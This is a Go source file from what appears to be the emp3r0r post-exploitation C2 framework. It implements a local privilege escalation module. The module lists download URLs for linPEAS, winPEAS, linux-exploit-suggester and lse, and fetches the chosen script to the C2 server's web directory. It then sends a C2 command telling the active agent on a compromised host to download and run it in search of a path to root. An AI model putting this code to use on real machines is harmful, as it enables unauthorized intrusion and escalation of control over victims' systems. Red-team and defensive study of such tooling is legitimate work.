package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/tools"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// LPEHelperURLs scripts that help you get root
var LPEHelperURLs = map[string]string{
	"lpe_les":         "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
	"lpe_lse":         "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	"lpe_linpeas":     "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
	"lpe_winpeas.ps1": "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1",
	"lpe_winpeas.bat": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
	"lpe_winpeas.exe": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe",
}

func moduleLPE() {
	go func() {
		// target
		target := live.ActiveAgent
		if target == nil {
			logging.Errorf("Target not exist")
			return
		}
		helperOpt, ok := live.ActiveModule.Options["lpe_helper"]
		if !ok {
			logging.Errorf("Option 'lpe_helper' not found")
			return
		}
		helperName := helperOpt.Val

		// download third-party LPE helper
		logging.Infof("Updating local LPE helper...")
		err := tools.DownloadFile(LPEHelperURLs[helperName], live.Temp+transport.WWW+helperName)
		if err != nil {
			logging.Errorf("Failed to download %s: %v", helperName, err)
			return
		}

		// exec
		logging.Printf("This can take some time, please be patient")
		cmd := fmt.Sprintf("%s --script_name %s", def.C2CmdLPE, helperName)
		logging.Infof("Running %s", cmd)
		err = CmdSender(cmd, "", target.Tag)
		if err != nil {
			logging.Errorf("Run %s: %v", cmd, err)
		}
	}()
}
